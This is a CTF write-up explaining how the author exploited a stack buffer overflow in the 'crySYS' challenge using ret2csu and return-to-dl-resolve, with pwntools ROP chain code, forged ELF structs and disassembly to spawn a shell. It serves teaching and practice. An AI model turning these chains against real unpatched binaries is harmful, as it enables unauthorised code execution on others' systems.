___
# Intro

During the last CTF I played I was working on a really nice challenge, which 
I think is worth a writeup. The challenge was called crySYS and all the materials
can be find on my [github](https://github.com/gast04/CTF-Writeups/tree/master/crySYS).

The Challenge itself contained a simple bufferoverflow and the goal was to get
a shell on the server. Even the source code was given: 

```C
#include <stdio.h>
#include <unistd.h>

//gcc -o challenge -no-pie -fno-stack-protector challenges.c
//LD_PRELOAD=./libc-2.27.so ./ld-2.27.so ./challenge

int not_vulnerable() {
  char buf[80];
  return read(0, buf, 0x1000);
}

int main() {
  not_vulnerable();
  return 0;
}
```

Furthermore, we see the compile command and we know there is no stack canary
which means the binary is exploitable.

The Rest of this blog I will describe my two attempts of how I solved it.

<br/>

___
# Background Information

You might think, why we just dont do `return2libc`? and I thought that in the first
moment as well but for a `return2libc` attack you always need a leak, like in
this example the resolved address of `read`, then calculate the base address
of the libc and then calculate the address of `system` or `exevp` or wathever.

For a `return2libc` attack we would need an address leak, but in this special 
case there is no function resolved which can leak anything. Only `read` is 
resolved. We could of course setup a write system call using a `ROPchain` but
this binary is so small that there are simply not enough gadgets.

So the only attack I could come up, was `return2dlresolve`. There are already
some good resources available regarding this attack:

* https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62
* https://www.rootnetsec.com/ropemporium-ret2csu/
* https://1ce0ear.github.io/2017/10/20/return-to-dl/
* https://ddaa.tw/hitcon_pwn_200_blinkroot.html

<br/>

___
# Tooling

For the exploit I use `python` with `pwntools`. I have a patched version
of `pwntools` which spawns `radare2` instead of `gdb` by calling
`gdb.attach(p, r2cmd="db {}".format(hex(offset)))` and I can pass it a
r2 startup command. (I have plans on doing a PR on pwntools about this patch.)

For the binary analysis I am using IDA 7.5, its just easy to read out
all the offsets from it, but as this binary is so small every other
tool will be fine too.

<br/>

___
# return-to-dl-resolve ?

This technique is pretty nice as it is independent of the used libc version and
it doesnt need a leak, all it requires is a `ROPchain` and a memory location
where we can write to.

To exploit it we are going to resolve the `execvp` function, we achieve this
by creating all structs needed by the dynamic linker to resolve this function,
and after it is resolved it will call it.

We need:
* forge structs: JMPREL-entry, SYMTAB-entry, STRTAB-entry
  ( we dont need everything excatly recreated just the bytes we need)
* write to a known address (we use bss segment)
* setup arguments for execvp call
* call dlresolve
* Hopefully having a shell at this point :)

<br/>

___
# First Attempt, simple ROP

To trigger the BO and call read again to read the forged structs we use:

```Python
chain_read  = b""
chain_read += b"A"*80                   # overflow padding
chain_read += b"B"*8                    # fake rbp
chain_read += p64(POP_RSI_POP_R15_RET)  # set read buffer
chain_read += p64(C_AREA)               # ptr to controlable buffer
chain_read += b"C"*8                    # dummy r15 data
chain_read += p64(MOV_EDI_CALL_READ)    # call read
chain_read += b"D"*16                   # note end of chain
```

`C_AREA` is the address of the `bss` segment which is `0x601030`. IDA shows
that this segment is only 8byte in size, as memory is handled in pages, we have
a whole page for our structs, which is more than enough.

The two `ROPgadgets` are simply setting up the arguments, as it is a 64bit binary
the three arguments for read are in the `rdi`,`rsi` and `rdx` registers.

This attempt can be found in `exp_version_1.py`. During debugging I noticed a
problem, the `read` call has this gadget:

```
.text:0000000000400500 E8 EB FE FF FF    call    _read
.text:0000000000400505 C9                leave
.text:0000000000400506 C3                retn
```

The `leave` instruction restores the `rsp` from the
`rbp` and we overwrite the `rbp`. Meaning we control where the `ROPchain`
continues. This is kind of bad, we dont want this power. Because I found no
way to set the rbp to a reasonable address on the stack, this means we loose the
rest of our `ROPchain`. Of course what we can do is, set the `rsp` to the `bss`
segment and write the rest of our `ROPchain` to the `bss` segment. But I
considered this as unecessary work, so I used a different approach `ret2csu`.

<br/>

___
# Second Attempt, ret2csu

Instead of simply calling `read` via a `ROPchain` I used the `ret2csu` method
to avoid loosing track of the `ROPchain`.

All the gadgets needed can be found in the `__libc_csu_init` function. On a
program startup this function calls all functions from the `.init_array`
segment. These are functions like constructors or initialization of global
variables and so on, like everything which has to be ready before the `main`
function is called.

The part of the function we need is:
```
.text:0000000000400560 4C 89 FA        mov     rdx, r15
.text:0000000000400563 4C 89 F6        mov     rsi, r14
.text:0000000000400566 44 89 EF        mov     edi, r13d
.text:0000000000400569 41 FF 14 DC     call    [r12+rbx*8]
.text:000000000040056D 48 83 C3 01     add     rbx, 1
.text:0000000000400571 48 39 DD        cmp     rbp, rbx
.text:0000000000400574 75 EA           jnz     short loc_400560
.text:0000000000400576 48 83 C4 08     add     rsp, 8
.text:000000000040057A 5B              pop     rbx
.text:000000000040057B 5D              pop     rbp
.text:000000000040057C 41 5C           pop     r12
.text:000000000040057E 41 5D           pop     r13
.text:0000000000400580 41 5E           pop     r14
.text:0000000000400582 41 5F           pop     r15
.text:0000000000400584 C3              retn
```

But we split it into two gadgets, the first starting at `0x400560` which
contains the function call, and the second one starts at `0x40057A`, this one
we use to correctly setup the arguments needed for the call at `0x400569`.

As we see there is no `leave` instructions, so nothing messes with the rsp,
except the `add rsp, 8` but we can overcome this easy with padding.

The `ROPchain` we will use is:
```Python
C_AREA     = 0x601030
CSU_RET    = 0x40057A
CSU_CALL   = 0x400560
RELOC_READ = 0x601018

chain_read  = b"A"*80                   # overflow padding
chain_read += b"B"*8                    # fake rbp
chain_read += p64(CSU_RET)              # gadget
chain_read += p64(0)                    # RBX (to get "call [r12]")
chain_read += p64(1)                    # RBP (to pass cmp rbp, rbx after call)
chain_read += p64(RELOC_READ)           # R12 (overwrite read GOT entry)
chain_read += p64(0)                    # R13 (has to be zero for stdin read)
chain_read += p64(C_AREA)               # R14 (ptr to controlable buffer)
chain_read += p64(0x100)                # R15 (amount we want to read)
chain_read += p64(CSU_CALL)
chain_read += b"D"*8                    # to counter (add rsp,8) after the call
```

This will call `read` and we can pass our forged structs into it. After the
read we continue and call the resolver.

<br/>

___
# Creating the Structs

This is the difficult part I think. The resovler needs these structs to correctly
resolve `execvp`. This works as follow (a short description as there is plenty
of material online)

A call to `read` calls into the `.plt` section:

```
.plt:00000000004003F0                    ; ssize_t read(int fd, void *buf, size_t nbytes)
.plt:00000000004003F0 FF 25 22 0C 20 00  jmp     cs:off_601018
.plt:00000000004003F6 68 00 00 00 00     push    0
.plt:00000000004003FB E9 E0 FF FF FF     jmp     resolver_4003E0
```

The `jmp` at address `4003F0` jumps to the address stored at this location
in the `GOT`. If `read` is already resolved it jumps directly to its implementation.
If not, it jumps back to `4003F6`, pushes the zero on the stack which is the
relocation argument. Defining at which offset in the `JMPREL Relocation Table`
the `read` entry can be found. In this case it is zero meaning that `read` is
the first entry.

Verifing this in IDA (skipping the bytes):
```
LOAD:00000000004003B0   ; ELF JMPREL Relocation Table
LOAD:00000000004003B0   Elf64_Rela <601018h, 100000007h, 0> ; R_X86_64_JUMP_SLOT read
```

Yes thats the case. The value in the `JMPRELentry` are the address on where to
store the resolved address, the `rel_info` which defines the type of relocation
and the offset in the symbol table. The index is calculated by shifting `rel_info`
32 bits to the right, so in this case its `100000007h >> 32 = 1`. So its
the second entry in the symbol table.

Verifing this in IDA (skipping the bytes):
```
LOAD:00000000004002B8   ; ELF Symbol Table
LOAD:00000000004002B8   Elf64_Sym <0>
LOAD:00000000004002D0   Elf64_Sym <0Bh, 12h, 0, 0, 0, 0> ; "read"
LOAD:00000000004002E8   Elf64_Sym <10h, 12h, 0, 0, 0, 0> ; "__libc_start_main"
LOAD:0000000000400300   Elf64_Sym <2Eh, 20h, 0, 0, 0, 0> ; "__gmon_start__"
```

Yes looks good, the first entry is always zero by the way. The first entry here
points to the offset in the string table. So the `read` string starts at offset
11 in the `STRTAB`.

Verifing this in IDA (skipping the bytes):
```
LOAD:0000000000400318   ; ELF String Table
LOAD:0000000000400318   byte_400318     db 0
LOAD:0000000000400319   aLibcSo6        db 'libc.so.6',0
LOAD:0000000000400323   aRead           db 'read',0
LOAD:0000000000400328   aLibcStartMain  db '__libc_start_main',0
LOAD:000000000040033A   aGlibc225       db 'GLIBC_2.2.5',0
LOAD:0000000000400346   aGmonStart      db '__gmon_start__',0
```

`0x23-0x18 = 11` and thats also matching. Nothing more is needed. We need
to push the correct offset on the stack before calling the resolver. This
offset has to point to the `bss` segment where our forged `JMPRELentry` lies.
This entry has to contain valid parameters for the `GOT` offset, we reuse the
one from read, and the `rel_info`. Where `rel_info` also has to point to the
`bss` segment to our forged symbol table entry. And last, in the symbol table
entry we need a valid pointer to the `execvp` offset in the string table.

This all is calculated as follows:
```Python

FORGED_AREA = C_AREA + 0x20                      # space for sh\x00 string

# calculate relocation offset
rel_offset = int((FORGED_AREA - JMPREL)/24)      # must be divideable with 0 rest
elf64_sym_struct = FORGED_AREA + 0x28            # sym struct offset
index_sym = int((elf64_sym_struct - SYMTAB)/24)  # calculate symbol table offset

r_info = (index_sym << 32) | 0x7                 # 7 -> plt relocation type
elf64_jmprel_struct  = p64(bin_elf.got['read'])  # just reuse read offset
elf64_jmprel_struct += p64(r_info)
elf64_jmprel_struct += p64(0)
elf64_jmprel_struct += b"P"*16                   # padd to size 40 for second 24 division

st_name = (elf64_sym_struct + 0x20) - STRTAB     # offset to "execvp"
elf64_sym_struct = p64(st_name) + p64(0x12) + p64(0) + p64(0)

# putting structs together
chain_structs  = b"sh\x00"            # bin sh string as argument to resolver
chain_structs += p64(0)               # for execvp argv pointer
chain_structs += b"P"*21              # padding
chain_structs += elf64_jmprel_struct  # forged jmprel entry struct
chain_structs += elf64_sym_struct     # forged symbol table struct
chain_structs += b"execvp\x00"        # function to resolve
chain_structs += b"X"*17              # end of forged struct
```

It's important to note that all addresses have to be 24byte aligned, as those
entries are 24bytes in size.

<br/>

___
# Final Stage

Now that we have all the pieces. The last step is to call the resolver and
trigger the resolving of `excevp`. This is done using a simple `ROPchain`:

```Python
chain_read += p64(POP_RDI)              # set execvp file arg
chain_read += p64(C_AREA)               # sh string
chain_read += p64(POP_RSI_POP_R15_RET)  # empty args str
chain_read += p64(C_AREA+2)             # null ptr arg to execvp
chain_read += b"R"*8                    # dummy r15
chain_read += p64(RESOLVER_ADDR)        # call resolver
chain_read += p64(rel_offset)           # reloc_index arg
chain_read += b"E"*16                   # end of chain
```

Of course before calling the resolver we have to setup the arguments for
execvp, as the resolver calls it after successful resolving.

The resolver works in two steps, first `_dl_runtime_resolve`
([source](https://code.woboq.org/userspace/glibc/sysdeps/x86_64/dl-trampoline.h.html)) 
is called which saves all the register on the stack and prepares the call to
`_dl_fixup` ([source](https://code.woboq.org/userspace/glibc/elf/dl-runtime.c.html)).
This function access the entries of our forged structs and calls `_dl_lookup_symbol_x`
which is then resolving our function.

Calling the completed exploit `exp_version_3.py` returns a shell.

<br/>

___
# Final Notes

This technique was really nice to exploit, and it's a bit advanced I would say.
The thing which did not work until the end was, that in `_dl_fixup` there exists
this version check:

```C
if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)
{
  const ElfW(Half) *vernum = (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;
  version = &l->l_versions[ndx];
  if (version->hash == 0)
    version = NULL;
}
```

I patched this to be NULL manually in the debugger. I leave this as an exercise
to the reader on how to pass this check. Because if it is not avoided the
exploit will die in a SEGFAULT on this `vernum[ELFW(R_SYM) (reloc->r_info)]`
derefrenciation.
<br/>
